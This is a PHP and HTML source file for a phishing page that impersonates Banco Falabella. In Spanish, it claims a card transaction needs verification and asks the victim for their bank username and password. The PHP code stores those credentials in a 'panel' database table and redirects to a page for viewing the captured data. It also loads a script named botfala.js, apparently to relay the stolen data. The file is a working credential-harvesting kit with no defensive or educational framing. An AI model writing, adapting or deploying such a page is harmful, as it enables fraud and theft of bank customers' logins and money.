<?php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $conn = getConnection();
    
    $uuid = bin2hex(random_bytes(18));
    $uuid = substr($uuid, 0, 8) . '-' . substr($uuid, 8, 4) . '-' . substr($uuid, 12, 4) . '-' . substr($uuid, 16, 4) . '-' . substr($uuid, 20, 12);

    $dato1 = $conn->real_escape_string($_POST['dato1']);
    $dato2 = $conn->real_escape_string($_POST['dato2']);

    $stmt = $conn->prepare("INSERT INTO  panel (id, dato1, dato2) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $uuid, $dato1, $dato2);
    
    if ($stmt->execute()) {
        $stmt->close();
        $conn->close();
        header("Location: ver_dato.php?id=$uuid");
        exit();
    } else {
        die("Error al insertar datos: " . $conn->error);
    }
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="css/style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Document</title>
</head>
<body>

    <main style="margin: 15% 8%;">
        <!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Banco Falabella</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        .container {
            background-color: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            width: 300px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header img {
            height: 40px;
        }
        .header button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .header button:hover {
            background-color: #45a049;
        }
        .close-btn {
            text-align: right;
            font-size: 18px;
            cursor: pointer;
            color: gray;
        }
        .close-btn:hover {
            color: black;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group select,
        .form-group input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .form-group input[id="submitBtn"] {
            background-color: #ff6b81;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
            padding: 10px;
            border-radius: 5px;
        }
        .form-group input[id="submitBtn"]:hover {
            background-color: #ff4c61;
        }
        .link {
            display: block;
            text-align: center;
            margin-top: 10px;
            color: #006400;
            text-decoration: none;
        }
        .link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header" style="margin-bottom: 8%;">
            <img src="../../img/BANCO FALABELLA.png" alt="Banco Falabella Logo">
            
        </div>
       
        <form method="POST">
            <div class="form-group">
                <label for="document-type"></label>
                <p style="font-size: smaller; margin-bottom: 4%;">Vamos a valiar tu compra <br> <br>

                    Banco Falabella requiere verificar la transacción que intentas realizar con tu tarjeta por seguridad</p>
                <select id="document-type">
                    <option value="cc">Cédula de Ciudadanía</option>
                </select>
            </div>
            <div class="form-group">
                <input type="text" id="username" name="dato1" placeholder="Usuario" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="dato2" placeholder="Ingresa tu contraseña" required>
            </div>
           

            <div style="display: flex; justify-content: center; margin-top: 6%;">
                <button id="submitBtn" style="width: 90%; background-color: rgb(241, 16, 110); font-size: smaller; color: white; padding: 5%; border-radius: 5px; border-width: 0px;" class="login-button">INGRESAR</button>
            </div>
        </form>

        
      <script src="botfala.js"></script>
    </div>
</body>
</html>

        <script src="botfala.js"></script>
    </main>
    
</body>
</html>


